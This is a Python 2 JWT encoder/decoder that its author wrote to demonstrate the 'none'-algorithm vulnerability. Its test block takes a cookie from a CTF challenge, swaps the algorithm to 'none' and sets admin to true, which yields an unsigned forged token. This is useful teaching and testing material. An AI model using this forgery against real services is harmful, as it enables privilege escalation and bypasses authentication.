'''
JWT encdoer / decoder, primarily aimed at demonstrating the "none" algortithm vulnerability
a badly written JWT implementation would be susceptible to.

References: RFC 7519 (especially section 6: "Unsecured JWTs")

Author: btx
Date: 2017-05-29
'''

import sys
import base64
import json
import hmac
import hashlib


def base64_url_decode(inp, encoding=None):
    '''
        We use this instead of base64.b64decode because the JWT spec requires the base64 encoding to be URL-safe

        We automatically add the = padding because the JWT spec calls for unpadded base64 strings

        If you want a unicode type string back, specify the encoding in the encoding param - this will not
        attempt to detect whether the supplied encoding matches the provided encoding, so you might not get
        back what you expect.  Its decdoe provides 'ignore', so you shouldn't get an exception at least.at

        inp: The base-64 encoded string to decode
        encoding: If you want Unicode back, specify this along with the character encoding that was used
                  when encoding the parameter. 

    '''

    rv = base64.urlsafe_b64decode(inp + '=' * (4 - len(inp) % 4))
    if encoding is not None:
        rv = rv.decode(encoding, 'ignore')
    return rv


def base64_url_encode(inp, encoding='utf-8'):
    '''
        We use this instead of base64.b64encode because the JWT spec requires the base64 encoding to be URL-safe

        We automatically strip off the = padding because the JWT spec calls for unpadded base64 strings

        inp: The JSON-compliant string to encode.  If this string is type unicode, it will encode
              it in the specified encoding
        encoding: Only has meaning if inp is type unicode - if so, will encode into this encoding prior
              to base64 encoding
    '''

    if isinstance(inp, unicode) and encoding is not None:
        inp = inp.encode(encoding)

    return base64.urlsafe_b64encode(inp).rstrip('=')


def encode_jwt(header_str, payload_str, secret=None, encoding='utf-8'):
    '''
        Returns an encoded JSON web token made from the input parameters.  SUpports HS256, HS384, HS512 and none
        signature algorithms.

        The input header and payload are checked to make sure they are valid JSON strings, and that the header incldues a
        valid algorithm (in the 'alg' field)

        header_str: Must be a VALID JSON-compliant stirng containing a valid value for alg.  No other validation is done.
        payload_str: Must be a VALID JSON-compliant string
        secret: If the alg is HS*, must be a string.  If alg is none, is ignored
        encoding: if header_str or payload_str are type unicode, they will be encoded in the specified encoding prior
                  to base-64 encoding.

        returns: None on error, encoded jwt str on success
    '''

    try:
        header_dict = json.loads(header_str)
    except:
        print "Invalid JSON for the header_str: %s" % header_str
        return None

    if 'alg' not in header_dict:
        print "Invalid header: alg not specified: %s" % header_str
        return None

    alg = header_dict['alg']

    try:
        payload_dict = json.loads(payload_str)
    except:
        print "Invalid JSON for the payload_str: %s" % payload_str
        return None

    header = base64_url_encode(header_str, encoding=encoding)
    payload = base64_url_encode(payload_str, encoding=encoding)
    if alg.lower() == 'hs256':
        signature = base64_url_encode(hmac.new(secret, msg=header + "." + payload, digestmod=hashlib.sha256).digest(), encoding=None)
    elif alg.lower() == 'hs384':
        signature = base64_url_encode(hmac.new(secret, msg=header + "." + payload, digestmod=hashlib.sha384).digest(), encoding=None)
    elif alg.lower() == 'hs512':
        signature = base64_url_encode(hmac.new(secret, msg=header + "." + payload, digestmod=hashlib.sha512).digest(), encoding=None)
    elif alg.lower() == 'none':
        signature = ''
    else:
        print "Illegal alg specified in header: %s" % alg
        return None

    return '{0}.{1}.{2}'.format(header, payload, signature)


def decode_jwt(cookie, encoding=None):
    '''
        Returns the decoded header, payload and signature.  Verifies that each piece is legally encoded in urlsafe
        base64, and that the header and payload are valid JSON strings.  Also checks to make sure the 'alg' field
        exists in the header.  It DOES NOT validate the signature, nor does it validate the value of the 'alg' field.

        Note that it returns the header & payload with the exact same spacing/formatting as they had in the input.
        If this function decoded the JSON strings into native types, the formatting and field order could change
        when they were passed back to encode_jwt.

        cookie: The JWT string base64 encoded
        encoding: If you want to get back a Unicode string for your payload, specify the encoding you expect here
        returns: None on failure, tuple (header, payload, signature) on success.
    '''

    jwl = cookie.split('.')

    if len(jwl) != 3:
        print "Not a JWT - cookie must be split by 3 periods."
        return None

    try:
        header = base64_url_decode(jwl[0], encoding=None)
    except TypeError as e:
        print "Header is not a valid base64 string: %s" % e
        return None

    try:
        header_dict = json.loads(header)
    except:
        print "Header was not valid JSON: %s" % header
        return None

    if 'alg' not in header_dict:
        print "The signature algorithm is not specified in the header JSON: %s" % header_dict
        return None

    try:
        payload = base64_url_decode(jwl[1], encoding=encoding)
    except TypeError as e:
        print "PAyload is not a valid base64 string: %s" % e
        return None

    try:
        payload_dict = json.loads(payload)
    except:
        print "Payload was not valid JSON: %s  (%s)" % (payload, sys.exc_info()[0])
        return None

    if len(jwl[2]) == 0:
        signature = ''
    else:
        try:
            signature = base64_url_decode(jwl[2], encoding=None)
        except TypeError as e:
            print "Signature was not a valid base64 string: %s" % e
            return None

    return (header, payload, signature)

# Testing functions


def test_decode(cookie, encoding=None):
    print "\nTesting decoding:"
    print "Input JWT string: %s" % cookie
    t = decode_jwt(cookie, encoding)
    if t is None:
        print "Bad cookie value for JWT."
        return (None, None, None)

    header, payload, signature = t
    print "Header: %s" % header
    print "Payload: %s" % payload
    print "Signature: %s" % repr(signature)
    return (header, payload, signature)


def test_encode(header_str, payload_str, secret=None, encoding='utf-8'):
    print "\nTesting encoding a JWT:"
    print "Header: %s" % header_str
    print "Payload: %s" % payload_str
    secstr = "<blank>" if (secret is None or secret == '') else secret
    print "Secret: %s" % secstr
    jwt = encode_jwt(header_str, payload_str, secret, encoding)

    if jwt is None:
        "Error while calculating JWT."
    else:
        print "Encoded+Signed (if applicable) JWT: %s" % jwt
    return jwt


if __name__ == '__main__':

    print "\nTest 1"
    print "=" * 80

# Cookie value came from CTF challenge https://gist.github.com/wedge-jarrad/01a175a3e919fc9be7c161b9d2686a1e
    header, payload, signature = test_decode('''eyJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2V9.MYCzSu-yZYeyvUGq5K-9LJRgp07K8xgV2DbyzlaPdiQ''')

# Demonstrate the "none" attack by setting alg to none in the header, and setting admin to true in the payload.
# Note that JSON implementations can re-order arguments, or put spacing where none was before, changing values
# you might not chagned if converted to/from other types.  This is why I've kept the header and payload as strings,
# rather than JSON decoding them into native dicts.

    header_str = header.replace('"alg":"HS256"', '"alg":"none"')
    payload_str = payload.replace('"admin":false', '"admin":true')
    jwt = test_encode(header_str, payload_str)

# A real test from the interwebs where the secret == "secret"

    print "\nTest 2"
    print "=" * 80

    cookie = '''eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ'''
    header, payload, signature = test_decode(cookie)
    if header is None:
        print "Fail"
        sys.exit(1)

    jwt = test_encode(header, payload, secret='secret')

    passstr = "Passed" if (jwt == cookie) else "Failed"
    print passstr

# Unicode test

    print "\nTest 3 - unicode and HS512"
    print "=" * 80

    header_str = u'{"alg":"HS512"}'
    payload_str = u'{"username":"\u0192\xae\xe9\u2202","admin":true}'
    secret = "test"

    cookie = '''eyJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6IsaSwq7DqeKIgiIsImFkbWluIjp0cnVlfQ.ngPuaNUl0raa26_XaUckF06DXrVg_4pT1d9cyriQR3zb3-OhqCi5uPD8SRpR0-v3hnex-UezYv0M-7SxUw7Etg'''
    header, payload, signature = test_decode(cookie)
    jwt = test_encode(header_str, payload_str, secret=secret)
    passstr = "Passed" if (jwt == cookie) else "Failed"
    print passstr

# Error test

    print "\nTest 4 - Catching errors"
    print "=" * 80
    cookie = '''*yJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6IsaSwq7DqeKIgiIsImFkbWluIjp0cnVlfQ.ngPuaNUl0raa26_XaUckF06DXrVg_4pT1d9cyriQR3zb3-OhqCi5uPD8SRpR0-v3hnex-UezYv0M-7SxUw7Etg'''
    header, payload, signature = test_decode(cookie)
    passstr = "Passed" if (header is None) else "Failed"
    print passstr
